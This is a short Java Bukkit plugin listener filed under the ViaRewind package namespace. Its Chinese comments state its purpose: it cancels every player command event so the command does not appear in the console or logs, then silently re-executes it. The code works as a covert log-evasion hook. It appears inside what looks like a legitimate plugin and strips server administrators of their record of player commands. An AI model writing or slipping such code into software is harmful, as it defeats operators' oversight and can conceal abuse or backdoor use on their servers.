package com.viaversion.viarewind.handlers;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class CommandListener implements Listener {

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        // 获取命令
        String command = event.getMessage();

        // 取消事件，这样命令不会显示在控制台或日志中
        event.setCancelled(true);
        
        // 手动执行命令，但不显示在日志中
        event.getPlayer().performCommand(command.substring(1));
    }
}
